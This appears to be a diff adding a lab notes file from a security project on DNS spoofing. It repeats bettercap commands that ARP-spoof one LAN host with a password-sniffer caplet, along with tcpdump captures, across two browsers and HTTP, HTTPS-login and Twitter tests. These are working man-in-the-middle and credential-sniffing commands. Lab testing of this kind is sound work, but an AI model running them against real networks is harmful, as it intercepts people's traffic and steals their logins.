@@ -1,0 +1,88 @@
+
+cat > /root/Desktop/security-project/dns-spoofing/bettercap/explorer-http-perros.log
+
+bettercap -debug -caplet simple-passwords-sniffer.cap -eval \ "
+events.stream off;
+set arp.spoof.targets 192.168.2.13;
+set events.stream.output /root/Desktop/security-project/dns-spoofing/bettercap/explorer-http-perros.log; \
+set events.stream.output.rotate false; \
+events.ignore endpoint.lost; events.ignore endpoint.new; \
+events.stream on;"
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/bettercap/tcp-dump-explorer-http-perros.pcap
+ -i eth1 host 192.168.2.13
+
+------------------------------
+
+cat > /root/Desktop/security-project/dns-spoofing/bettercap/explorer-https-web-login.log
+
+bettercap -debug -caplet simple-passwords-sniffer.cap -eval \ "
+events.stream off;
+set arp.spoof.targets 192.168.2.13;
+set events.stream.output /root/Desktop/security-project/dns-spoofing/bettercap/explorer-https-web-login.log; \
+set events.stream.output.rotate false; \
+events.ignore endpoint.lost; events.ignore endpoint.new; \
+events.stream on;"
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/bettercap/tcp-dump-explorer-https-web-login.pcap
+ -i eth1 host 192.168.2.13
+
+----------------------------------------
+
+cat >  /root/Desktop/security-project/dns-spoofing/bettercap/explorer-twitter.log
+
+bettercap -debug -caplet /root/Desktop/security-project/dns-spoofing/bettercap/testing-caplet.cap -eval \ "
+events.stream off;
+set arp.spoof.targets 192.168.2.13;
+set events.stream.output /root/Desktop/security-project/dns-spoofing/bettercap/explorer-twitter.log; \
+set events.stream.output.rotate false; \
+events.ignore endpoint.lost; events.ignore endpoint.new; \
+events.stream on;"
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/bettercap/tcp-dump-explorer-twitter.pcap
+ -i eth1 host 192.168.2.13
+
+ --------------------------------
+
+ cat > /root/Desktop/security-project/dns-spoofing/bettercap/firefox-http-perros.log
+
+bettercap -debug -caplet simple-passwords-sniffer.cap -eval \ "
+events.stream off;
+set arp.spoof.targets 192.168.2.13;
+set events.stream.output /root/Desktop/security-project/dns-spoofing/bettercap/firefox-http-perros.log; \
+set events.stream.output.rotate false; \
+events.ignore endpoint.lost; events.ignore endpoint.new; \
+events.stream on;"
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/bettercap/tcp-dump-firefox-http-perros.pcap
+ -i eth1 host 192.168.2.13
+
+ ---------------------------------
+
+ cat > /root/Desktop/security-project/dns-spoofing/bettercap/firefox-https-web-login.log
+
+bettercap -debug -caplet simple-passwords-sniffer.cap -eval \ "
+events.stream off;
+set arp.spoof.targets 192.168.2.13;
+set events.stream.output /root/Desktop/security-project/dns-spoofing/bettercap/firefox-https-web-login.log; \
+set events.stream.output.rotate false; \
+events.ignore endpoint.lost; events.ignore endpoint.new; \
+events.stream on;"
+
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/bettercap/tcp-dump-firefox-https-web-login.pcap
+ -i eth1 host 192.168.2.13
+
+----------------------------------------------------
+
+cat >  /root/Desktop/security-project/dns-spoofing/bettercap/firefox-twitter.log
+
+bettercap -debug -caplet /root/Desktop/security-project/dns-spoofing/bettercap/testing-caplet.cap -eval \ "
+events.stream off;
+set arp.spoof.targets 192.168.2.13;
+set events.stream.output /root/Desktop/security-project/dns-spoofing/bettercap/firefox-twitter.log; \
+set events.stream.output.rotate false; \
+events.ignore endpoint.lost; events.ignore endpoint.new; \
+events.stream on;"
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/bettercap/tcp-dump-firefox-twitter.pcap -i eth1 host 192.168.2.13
